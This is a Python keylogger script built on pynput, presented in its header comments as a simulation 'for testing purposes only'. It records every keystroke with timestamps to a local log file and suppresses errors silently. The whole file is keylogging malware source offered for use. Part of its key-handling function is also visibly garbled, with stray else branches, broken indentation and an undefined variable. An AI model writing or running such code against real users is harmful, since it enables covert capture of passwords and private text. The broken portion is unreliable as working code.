# This is the code for the simulation. Test it in a virtual environment
# For testing purposes only

import pynput
import time
import threading
from datetime import datetime
import os

# Global variables for buffering and state
current_line = []
log_file = "log.txt"

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

def get_key_char(key):
    try:
        # Handle regular characters
        return str(key.char)
    except AttributeError:
        # Handle special keys
        key_str = str(key).replace('Key.', '')
        spacing_map = {
            'space': ' ',
            'enter': '\n',
            'tab': '\t',
            'backspace': '[BS]',
            'delete': '[DEL]',
            'shift': '',
            'ctrl': '',
            'alt': '',
            'cmd': '',
            'esc': '[ESC]',
            'caps_lock': '[CAPS]'
}
        return spacing_map.get(key_str, f'[{key_str.upper()}]')

def write_line():
    global current_line
    if current_line:
        timestamp = get_timestamp()
        line = ''.join(current_line).rstrip()  # Remove trailing spaces
        log_entry = f"[{timestamp}] {line}\n"
        
        try:
            with open(log_file, "a", encoding='utf-8') as f:
                f.write(log_entry)
        except Exception:
            pass  # Silently fail on write errors
        
        current_line = []

def on_press(key):
    global current_line, last_space_time
    
    try:
        char = get_key_char(key)
        
        current_time = time.time()
        
        # Handle special cases
        if char == '\n':
            write_line()
            current_line = []
            return
        
        elif char in ('[BS]'):
            if current_line:
                current_line.pop()  # Remove last char (backspace effect)
            return
        
        # Add character to buffer
        current_line.append(char)
        
        current_line = [' ']  # Keep the space
                else:
                    current_line = [' ']  # Just starting new word
            last_space_time = current_time
            
            # Limit line length to prevent memory issues
            if len(''.join(current_line)) > 200:
                write_line()
                
    except Exception:
        # Silently handle any key processing errors
        pass

def on_release(key):
 pass

def main():
    # Clear log file on start
    try:
        with open(log_file, "w", encoding='utf-8') as f:
            f.write(f"Keylogger started: {get_timestamp()}\n\n")
    except Exception:
        pass
    
    print("Keylogger running... Press Ctrl+C to stop.")
    
    # Use daemon thread to ensure clean exit
    listener = pynput.keyboard.Listener(
        on_press=on_press,
        on_release=on_release,
        suppress=False  # Don't suppress key events
    )
    
    try:
        listener.start()
        listener.join()
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
        write_line()  # Flush final line
        with open(log_file, "a", encoding='utf-8') as f:
            f.write(f"\nKeylogger stopped: {get_timestamp()}\n")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
